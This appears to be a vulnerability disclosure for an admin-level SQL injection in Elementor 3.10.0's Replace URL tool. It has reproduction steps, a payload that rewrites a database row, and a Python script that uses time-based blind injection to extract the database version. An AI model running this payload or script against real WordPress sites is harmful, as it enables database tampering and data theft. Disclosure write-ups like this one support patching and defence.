# Admin + Sqli in Replace URL Module

**Affected Product**

Elementor Website Builder Wordpress plugin

**Version:** 3.10.0

**Severity**: Medium

**CVSS v3 Score:** 6.6:[AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:L/E:F/RL:W/RC:C/CR:H/IR:H/AR:H/MAV:N/MAC:L/MPR:H/MUI:N/MS:U/MC:N/MI:H/MA:L](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:L/E:F/RL:W/RC:C/CR:H/IR:H/AR:H/MAV:N/MAC:L/MPR:H/MUI:N/MS:U/MC:N/MI:H/MA:L&version=3.1)

**Description**

Replace URL in Tools module is vulnerable to SQL Injection. 

**Steps to Reproduce**

1. Install the Elementor Free plugin.
2. Login with the admin role and activate the plugin.
3. Navigate to the tools section in the plugin.

![Untitled](Admin%20+%20Sqli%20in%20Replace%20URL%20Module%20cc5a70dd1fb94c38b93dd0e604ddb343/Untitled.png)

1. Before the injection, meta_key of the meta_id 99999 is key3

![Untitled](Admin%20+%20Sqli%20in%20Replace%20URL%20Module%20cc5a70dd1fb94c38b93dd0e604ddb343/Untitled%201.png)

1. Navigate to “Replace URL” section and insert the SQLi payload in the “new-uri” field.

Payload: [`http://localhost:8000/?test'),meta_key='key4'where+meta_id=99999;#`](http://localhost:8000/?test%27),meta_key=%27key4%27where+meta_id=99999;#)

Above payload will update the meta_key to key4 of meta_id=999999

![Untitled](Admin%20+%20Sqli%20in%20Replace%20URL%20Module%20cc5a70dd1fb94c38b93dd0e604ddb343/Untitled%202.png)

1. Click on the Replace URL and Observe the popup “One Row Updated”. we can confirm the same in the database as well.

![Untitled](Admin%20+%20Sqli%20in%20Replace%20URL%20Module%20cc5a70dd1fb94c38b93dd0e604ddb343/Untitled%203.png)

**Vulnerable Code Snippets:**

1. URL is directly being used in the query statement after validating it with “filter_var( $from, FILTER_VALIDATE_URL )” which can be bypassed.
    
    ![Untitled](Admin%20+%20Sqli%20in%20Replace%20URL%20Module%20cc5a70dd1fb94c38b93dd0e604ddb343/Untitled%204.png)
    
    wp-content/plugins/elementor/includes/utils.php#L172-184

**Exploit**

```python3
import requests as r 
import string
from requests import Timeout
import urllib.parse
import time
import re

url = "http://localhost:8000/payatu/wordpress/wp-admin/admin-ajax.php?_fs_blog_admin=true"
#proxies = {"http":"http://localhost:8080"}
possibilites = string.digits+'-.'+string.ascii_lowercase
data = "action=elementor_replace_url&from=http%3A%2F%2Flocalhost%3A8000&to=http%3A%2F%2Flocalhost%3A8000%2F%3Ftest')%2Cmeta_key%3D'key7'where%2Bmeta_id%3D(99999)and((IF((SELECT%2Bversion()like'{}%25')%2Csleep(2)%2C0)))%3B%23&_nonce=6253de9ef8"
version = ""
headers = {"Cookie":"wordpress_logged_in_e695f32e6b8dbfe4dad4de7d8125134d=<redacted>;","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}

while 1:
    for char in possibilites:
        try:
            body = data.format(version+char)
            res = r.post(url,data=body,timeout=2,headers=headers)

        except Timeout:
            version+=char
            print(version)
            break
```

![Untitled](Admin%20+%20Sqli%20in%20Replace%20URL%20Module%20cc5a70dd1fb94c38b93dd0e604ddb343/sqlDatabase.png)
